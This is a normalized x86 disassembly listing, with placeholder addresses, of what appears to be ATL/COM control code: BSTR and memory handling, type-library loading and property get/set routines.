pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
mov eax [ ebx + 0xa0 ]
push eax
call [ lstrlenW@IAT ]
lea esi [ eax + 0x1 ]
lea edx [ esi + esi ]
push edx
call [ CoTaskMemAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop ebx
mov esi 0x1
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
cmp [ edi ] 0x0
jne r-xdata
push esi
mov esi [ ebx + 0xa0 ]
push edi
call sub_408690
add esp 0x8
test al al
jne r-xdata
pop ebx
pop edi
mov eax 0x8007000e
pop esi
pop ebp
retn 0xc
mov eax [ ebp + 0xc ]
mov [ eax ] edi
xor esi esi
pop ebx
pop edi
mov eax 0x80004005
pop esi
pop ebp
retn 0xc
sub_408780
push ebp
mov ebp esp
push 0xffffffff
push sub_4453aa
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x10 ]
test edi edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ edi ] 0x0
cmp [ eax + 0x34 ] 0x0
mov esi 0x80004001
je r-xdata
mov eax 0x80004003
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
mov [ ebp + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x1
mov eax [ eax + 0x34 ]
mov ecx [ eax ]
lea edx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0xc ]
push edx
push eax
mov eax [ ecx + 0x48 ]
call eax
test eax eax
js r-xdata
mov esi 0x80004001
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ eax ]
mov edx [ ecx ]
push edi
push r--data
push eax
call edx
mov esi eax
test esi esi
js r-xdata
cmp [ edi ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
sub_408850
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ esi ] 0x0
mov eax [ ecx + 0x34 ]
test eax eax
je r-xdata
mov eax 0x80004003
pop esi
pop ebp
retn 0x8
mov eax [ ecx + 0x30 ]
mov [ esi ] eax
mov ecx [ ecx + 0x30 ]
test ecx ecx
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x4c ]
push esi
push eax
call edx
test eax eax
js r-xdata
xor eax eax
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
push ecx
call eax
mov eax 0x80004002
pop esi
pop ebp
retn 0x8
cmp [ esi ] 0x0
jne r-xdata
pop esi
pop ebp
retn 0x8
sub_4088b0
push ebp
mov ebp esp
push 0xffffffff
push sub_4465c0
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x14 ]
xor ecx ecx
test eax eax
setne cl
test ecx ecx
jne r-xdata
mov [ eax ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x34 ] 0x0
mov edi 0x1
je r-xdata
mov eax 0x80004003
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x10
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x10
mov [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov edi [ eax + 0x34 ]
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
push eax
call [ SysAllocString@IAT ]
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
xor esi esi
mov [ ebp + 0x10 ] esi
mov [ ebp - 0x4 ] 0x1
mov edx [ ebp + 0xc ]
mov eax [ edi ]
mov eax [ eax + 0x50 ]
lea ecx [ ebp + 0x8 ]
push ecx
push esi
push edx
push edi
call eax
mov edi eax
mov [ ebp - 0x4 ] 0x0
push esi
call [ SysFreeString@IAT ]
test edi edi
js r-xdata
push 0x8007000e
call sub_402d00
mov edi 0x1
mov ecx [ ebp + 0x8 ]
mov esi [ SysStringLen@IAT ]
push ecx
call esi
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call esi
lea esi [ eax + eax + 0x2 ]
push esi
call [ CoTaskMemAlloc@IAT ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push eax
mov eax esi
mov edx esi
call sub_402480
add esp 0x4
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov edx [ ebp + 0x8 ]
push edx
call [ SysFreeString@IAT ]
mov eax 0x8007000e
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x10
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x8 ]
push eax
call [ SysFreeString@IAT ]
sub_408a10
push ebp
mov ebp esp
push 0xffffffff
push sub_44658a
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
mov edi [ ebp + 0x8 ]
mov [ ebx ] 0x0
cmp [ edi + 0x34 ] 0x0
mov esi 0x1
je r-xdata
mov eax 0x80004003
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov [ ebp + 0x10 ] 0x0
mov [ ebp - 0x4 ] esi
mov eax [ edi + 0x34 ]
mov ecx [ eax ]
lea edx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0xc ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
cmp [ ebp + 0x10 ] 0x0
mov esi eax
je r-xdata
test esi esi
js r-xdata
mov ecx [ edi - 0x24 ]
mov edx [ ecx ]
lea eax [ edi - 0x24 ]
push ebx
push r--data
push eax
call edx
mov esi eax
mov esi 0x1
cmp [ ebx ] 0x0
jne r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
sub_408ae0
push ebp
mov ebp esp
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ eax ]
push edx
mov edx [ ebp + 0xc ]
push edx
push eax
mov eax [ ecx ]
call eax
pop ebp
retn 0xc
sub_408b90
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
je r-xdata
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
mov eax 0x8002000b
pop ebp
retn 0x10
xor eax eax
cmp [ rw-data ] eax
jne r-xdata
mov eax 0x80004003
pop esi
pop ebp
retn 0x10
mov ecx [ rw-data ]
mov [ esi ] ecx
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov eax [ ebp + 0x10 ]
push eax
call sub_409240
pop esi
pop ebp
retn 0x10
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
push ecx
call eax
xor eax eax
sub_408bf0
push ebp
mov ebp esp
xor eax eax
push esi
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] eax
je r-xdata
mov eax [ ebp + 0x10 ]
push eax
call sub_409240
cmp [ rw-data ] eax
jne r-xdata
pop esi
pop ebp
retn 0x10
cmp [ rw-data ] 0x0
push ebx
push edi
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ ebp + 0x14 ]
mov eax [ rw-data ]
mov ecx [ eax ]
push edx
mov edx [ ebp + 0xc ]
push edx
push esi
push eax
mov eax [ ecx + 0x28 ]
call eax
pop edi
pop ebx
cmp [ ebp + 0xc ] 0x1
jne r-xdata
mov eax [ esi ]
push eax
call [ lstrlenW@IAT ]
mov edi [ rw-data ]
dec edi
mov [ ebp + 0x10 ] eax
js r-xdata
mov edx [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea eax [ edx + ecx * 4 + 0x4 ]
sub eax 0xc
dec edi
jns r-xdata
mov edx [ esi ]
mov esi [ eax - 0x4 ]
add ecx ecx
cmp ecx 0x4
jb r-xdata
mov ecx [ eax ]
cmp [ ebp + 0x10 ] ecx
jne r-xdata
test ecx ecx
je r-xdata
mov ebx [ esi ]
cmp ebx [ edx ]
jne r-xdata
mov eax [ rw-data ]
lea edx [ edi + edi * 2 ]
mov ecx [ eax + edx * 4 + 0x8 ]
mov edx [ ebp + 0x14 ]
pop edi
pop ebx
mov [ edx ] ecx
xor eax eax
pop esi
pop ebp
retn 0x10
mov bl [ edx ]
cmp bl [ esi ]
jne r-xdata
mov esi [ ebp + 0x8 ]
sub ecx 0x4
add edx 0x4
add esi 0x4
cmp ecx 0x4
jae r-xdata
cmp ecx 0x1
jbe r-xdata
mov bl [ edx + 0x1 ]
cmp bl [ esi + 0x1 ]
jne r-xdata
cmp ecx 0x2
jbe r-xdata
mov cl [ edx + 0x2 ]
cmp cl [ esi + 0x2 ]
je r-xdata
sub_408ce0
push ebp
mov ebp esp
mov eax [ ebp + 0x1c ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push ecx
push edx
push eax
call sub_408bf0
pop ebp
retn 0x18
sub_408d00
push ebp
mov ebp esp
push 0xffffffff
push sub_446554
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x3
mov eax [ eax ]
mov ecx [ eax ]
lea edx [ ebp - 0x14 ]
push edx
push r--data
push eax
mov eax [ ecx ]
call eax
mov ecx [ esi ]
mov eax [ ecx ]
lea edx [ ebp - 0x10 ]
push edx
push r--data
push esi
call eax
mov ecx [ ebp - 0x14 ]
cmp ecx [ ebp - 0x10 ]
sete [ ebp + 0xb ]
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x10 ]
test eax eax
je r-xdata
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov al [ ebp + 0xb ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_408df0
push esi
mov esi [ ebx ]
push edi
call sub_408d00
test al al
jne r-xdata
mov eax [ edi ]
pop esi
retn
mov eax [ ebx ]
test edi edi
jne r-xdata
mov esi [ edi ]
mov [ edi ] 0x0
test eax eax
je r-xdata
xor eax eax
pop esi
retn
test esi esi
je r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push edi
push r--data
push eax
call edx
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
push esi
call ecx
sub_408e50
push ebp
mov ebp esp
push 0xffffffff
push sub_447098
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx [ ebp + 0x8 ]
xor eax eax
cmp ebx eax
jne r-xdata
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] eax
push 0xc
call [ operator new@IAT ]
add esp 0x4
mov esi eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax 0x80070057
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test esi esi
jne r-xdata
mov [ esi ] sub_408f50
mov [ esi + 0x4 ] rw-data
lea edi [ ebx + 0xc ]
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x4 ] 0x2
push edi
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x18 ] 0x1
mov [ ebp + 0x8 ] 0x0
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov [ ebx + 0x8 ] esi
mov [ ebp - 0x4 ] 0xffffffff
push edi
call [ LeaveCriticalSection@IAT ]
mov [ ebp - 0x18 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax 0x8007000e
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_408f50
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
mov [ esi + 0xc ] 0x0
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ esi + 0x14 ] 0x0
mov ecx [ eax - 0x4 ]
push edi
lea edi [ eax - 0x4 ]
push sub_408fb0
push ecx
push 0xc
push eax
call sub_444073
push edi
call [ `placement delete closure'@IAT ]
add esp 0x4
pop edi
sub_408fb0
push ebp
mov ebp esp
push 0xffffffff
push sub_444cc8
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ecx ]
push eax
call [ SysFreeString@IAT ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_409000
push ebp
mov ebp esp
push 0xffffffff
push sub_444cc8
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax ecx
mov [ ebp - 0x10 ] eax
xor ecx ecx
mov [ eax ] ecx
mov [ ebp - 0x4 ] ecx
mov [ eax + 0x4 ] ecx
or ecx 0xffffffff
mov [ eax + 0x8 ] ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_409050
push ebp
mov ebp esp
push 0xffffffff
push sub_445374
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx [ ebp + 0x8 ]
mov eax [ ebx ]
lea ecx [ ebp - 0x1c ]
push ecx
push ebx
mov edx [ eax + 0xc ]
call edx
xor edi edi
cmp eax edi
jl r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x1c ]
movzx eax [ eax + 0x2c ]
mov [ rw-data ] eax
mov [ rw-data ] edi
cmp eax edi
je r-xdata
mov [ ebp - 0x20 ] edi
cmp eax edi
jle r-xdata
mov [ ebp - 0x4 ] edi
mov esi [ rw-data ]
xor ecx ecx
mov eax esi
mov edx 0xc
mul edx
seto cl
neg ecx
or ecx eax
xor eax eax
add ecx 0x4
setb al
neg eax
or eax ecx
push eax
call sub_443fa9
add esp 0x4
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
mov ecx [ ebp - 0x14 ]
mov [ rw-data ] ecx
mov edx [ ebx ]
mov eax [ ebp - 0x1c ]
push eax
push ebx
mov ecx [ edx + 0x4c ]
call ecx
mov esi [ ebp - 0x14 ]
xor edi edi
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov [ eax ] esi
lea edi [ eax + 0x4 ]
push sub_408fb0
push sub_409000
push esi
push 0xc
push edi
call sub_4441a6
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
inc edi
mov [ ebp - 0x20 ] edi
add esi 0xc
cmp edi [ rw-data ]
jl r-xdata
mov [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebx ]
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x18 ]
mov edx [ eax ]
push edx
push ebx
mov eax [ ecx + 0x30 ]
call eax
test eax eax
js r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov ecx [ ebx ]
lea edx [ ebp - 0x18 ]
push edx
push edi
push ebx
mov eax [ ecx + 0x14 ]
call eax
test eax eax
js r-xdata
mov eax [ ebx ]
mov ecx [ ebp - 0x18 ]
push ecx
push ebx
mov edx [ eax + 0x50 ]
call edx
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x8 ]
push eax
call [ SysFreeString@IAT ]
mov edi [ ebp + 0x8 ]
mov [ ebp + 0x8 ] 0x0
mov eax [ esi ]
cmp eax edi
je r-xdata
mov eax [ rw-data ]
xor edi edi
mov ecx [ ebx ]
mov edx [ ebp - 0x1c ]
push edx
push ebx
mov eax [ ecx + 0x4c ]
call eax
mov eax 0x8007000e
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi ]
push eax
call [ SysStringLen@IAT ]
mov [ esi + 0x4 ] eax
mov ecx [ ebp - 0x18 ]
mov edx [ ecx ]
mov [ esi + 0x8 ] edx
mov edi [ ebp - 0x20 ]
push eax
call [ SysFreeString@IAT ]
mov [ esi ] edi
sub_409240
push ebp
mov ebp esp
push 0xffffffff
push sub_448a4f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x228
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
cmp [ rw-data ] ebx
je r-xdata
mov esi [ rw-data ]
add esi 0x10
mov [ ebp - 0x220 ] esi
mov [ ebp - 0x234 ] esi
mov [ ebp - 0x230 ] bl
mov [ ebp - 0x4 ] ebx
push esi
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x230 ] 0x1
mov [ ebp - 0x21c ] 0x80004005
cmp [ rw-data ] ebx
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
mov [ ebp - 0x21c ] ebx
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov dx [ rw-data ]
mov [ ebp - 0x228 ] ebx
cmp ecx [ eax ]
mov cx [ rw-data ]
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push esi
call [ LeaveCriticalSection@IAT ]
mov eax [ ebp - 0x21c ]
mov [ ebp - 0x230 ] bl
cmp [ rw-data ] ebx
jne r-xdata
lea edi [ ebp - 0x228 ]
push edi
mov edi [ ebp + 0x8 ]
push edi
movzx ecx cx
movzx edx dx
push ecx
push edx
push eax
call [ LoadRegTypeLib@IAT ]
mov [ ebp - 0x21c ] eax
mov edi [ rw-data ]
cmp edi [ eax + 0x4 ]
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
push eax
call sub_409050
mov [ ebp - 0x21c ] eax
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x220 ] ebx
mov [ ebp - 0x4 ] 0x3
mov eax [ ebp - 0x228 ]
mov ecx [ eax ]
lea edx [ ebp - 0x220 ]
push edx
mov edx [ rw-data ]
push edx
push eax
mov eax [ ecx + 0x18 ]
call eax
mov [ ebp - 0x21c ] eax
cmp eax ebx
jl r-xdata
mov edi [ rw-data ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ ebp - 0x228 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] bl
mov eax [ ebp - 0x220 ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x220 ]
mov [ ebp - 0x22c ] eax
cmp eax ebx
je r-xdata
mov edi [ rw-data ]
cmp edi [ eax + 0xc ]
jne r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x5
mov [ ebp - 0x224 ] ebx
mov [ ebp - 0x4 ] 0x7
mov eax [ ebp - 0x220 ]
mov ecx [ eax ]
lea edx [ ebp - 0x224 ]
push edx
push r--data
push eax
mov eax [ ecx ]
call eax
test eax eax
js r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
push eax
call edx
mov edi 0xffff
cmp dx di
jne r-xdata
mov eax [ ebp - 0x22c ]
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ ebp - 0x22c ] ebx
cmp eax ebx
je r-xdata
lea ebx [ ebp - 0x224 ]
lea edi [ ebp - 0x22c ]
call sub_408df0
xor ebx ebx
cmp cx di
jne r-xdata
xor eax eax
add eax 0x4
jmp r-xdata
mov eax [ rw-data ]
push 0x104
lea edx [ ebp - 0x218 ]
push edx
push eax
call [ GetModuleFileNameW@IAT ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] 0x3
mov eax [ ebp - 0x22c ]
cmp eax ebx
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
push eax
call sub_408e50
mov [ ebp - 0x4 ] 0x5
mov eax [ ebp - 0x224 ]
cmp eax ebx
je r-xdata
cmp eax 0x104
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x224 ] ebx
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x228 ]
push ecx
lea edx [ ebp - 0x218 ]
push edx
call [ LoadTypeLib@IAT ]
mov [ ebp - 0x21c ] eax
mov [ ebp - 0x4 ] bl
lea esi [ ebp - 0x224 ]
call sub_409b30
mov esi [ ebp - 0x220 ]
jmp r-xdata
cmp [ ebp - 0x21c ] ebx
jl r-xdata
sub_409520
push ebp
mov ebp esp
mov ecx [ rw-data ]
xor eax eax
test ecx ecx
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
call sub_409240
mov ecx [ rw-data ]
cmp [ rw-data ] eax
jne r-xdata
cmp eax 0x80020003
je r-xdata
mov eax [ ebp + 0x24 ]
mov edx [ ecx ]
push edi
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push eax
push ecx
mov ecx [ edx + 0x2c ]
call ecx
push ebx
mov ebx [ ebp + 0x18 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x28 ]
test ecx ecx
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x8 ]
test ecx ecx
je r-xdata
cmp eax 0x8002802b
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x24
mov edx [ ebp + 0x24 ]
mov eax [ ecx ]
mov eax [ eax + 0x18 ]
push edi
push edx
mov edx [ ebp + 0x20 ]
push edx
mov edx [ ebp + 0x1c ]
push edx
mov edx [ ebp + 0x14 ]
push ebx
push edx
mov edx [ ebp + 0x10 ]
push edx
push esi
push ecx
call eax
test eax eax
js r-xdata
test bl 0x4
je r-xdata
mov ecx [ ebp + 0x8 ]
push esi
add ecx 0xffffffb4
push ecx
call sub_409e60
sub_4095f0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x7c ]
and dl 0x1
movzx ecx dl
neg ecx
sbb ecx ecx
mov [ eax ] cx
xor eax eax
pop ebp
retn 0x8
mov eax 0x80004003
pop ebp
retn 0x8
sub_409620
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push eax
mov eax [ edx - 0x28 ]
push ecx
push eax
call [ InvalidateRect@IAT ]
xor eax eax
pop ebp
retn 0xc
sub_409640
push ebp
mov ebp esp
push 0xffffffff
push sub_44706e
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ esi + 0x80 ] eax
mov eax [ esi + 0x14 ]
mov [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ eax ]
lea edx [ ebp + 0x8 ]
push edx
push r--data
push eax
mov eax [ ecx ]
call eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x14 ]
push 0xfffffd43
push eax
call edx
mov ecx [ esi - 0x20 ]
mov edx [ ecx + 0x64 ]
lea eax [ esi - 0x20 ]
push 0x0
push 0x0
push eax
call edx
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x8
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_4096f0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x80 ]
mov [ eax ] edx
xor eax eax
pop ebp
retn 0x8
mov eax 0x80004003
pop ebp
retn 0x8
sub_409720
push ebp
mov ebp esp
push 0xffffffff
push sub_44701e
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax + 0x84 ] ecx
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov edx [ eax ]
mov edx [ edx ]
lea ecx [ ebp + 0x8 ]
push ecx
push r--data
push eax
call edx
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x14 ]
push 0xfffffd40
push eax
call edx
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_4097c0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x84 ]
mov [ eax ] edx
xor eax eax
pop ebp
retn 0x8
mov eax 0x80004003
pop ebp
retn 0x8
sub_4097f0
push ebp
mov ebp esp
push 0xffffffff
push sub_44701e
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax + 0x88 ] ecx
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov edx [ eax ]
mov edx [ edx ]
lea ecx [ ebp + 0x8 ]
push ecx
push r--data
push eax
call edx
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
